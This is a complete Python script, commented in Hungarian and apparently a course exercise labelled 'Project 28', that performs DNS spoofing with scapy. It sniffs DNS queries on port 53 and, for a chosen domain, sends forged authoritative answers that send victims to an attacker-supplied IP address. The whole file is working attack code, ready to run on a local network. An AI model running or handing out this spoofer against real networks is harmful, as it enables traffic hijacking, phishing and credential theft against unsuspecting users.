import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import argparse

# --- ÉRVELÉS ÉS PARAMÉTEREK KEZELÉSE ---
def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer Tool - Project 28")
    parser.add_argument("-d", "--domain", dest="target_domain", help="A célpont domain (pl. neverssl.com)", required=True)
    parser.add_argument("-r", "--redirect", dest="redirect_ip", help="Az IP cím, amire átirányítasz (pl. 192.168.0.230)", required=True)
    return parser.parse_args()

def process_packet(packet):
    scapy_packet = packet
    
    # Ellenőrizzük, hogy van-e benne DNS kérdés (DNSQR)
    if scapy_packet.haslayer(DNS) and scapy_packet.haslayer(DNSQR):
        # A byte-okat szöveggé alakítjuk a kereséshez
        qname = scapy_packet[DNSQR].qname.decode('utf-8')
        
        # Itt már a változót figyeljük, nem a beégetett szöveget
        if options.target_domain in qname:
            print(f"[+] Célpont észlelve: {qname}")
            print(f"    >>> Hazugság küldése: {options.redirect_ip}")
            
            try:
                # Válaszcsomag összeállítása
                spoofed_pkt = IP(src=scapy_packet[IP].dst, dst=scapy_packet[IP].src) / \
                              UDP(sport=scapy_packet[UDP].dport, dport=scapy_packet[UDP].sport) / \
                              DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qd=scapy_packet[DNS].qd, \
                                  an=DNSRR(rrname=scapy_packet[DNSQR].qname, ttl=10, rdata=options.redirect_ip))

                scapy.send(spoofed_pkt, verbose=False)
                print("    [+] Válasz elküldve!")
            except Exception as e:
                print(f"    [!] Hiba a küldéskor: {e}")

# --- FŐPROGRAM ---
options = get_arguments()

print("\n--- 😈 DNS SPOOFER INDÍTÁSA ---")
print(f"[*] Célpont: {options.target_domain} -> {options.redirect_ip}")
print("[*] Várakozás DNS kérésekre...")

scapy.sniff(filter="udp port 53", prn=process_packet, store=False)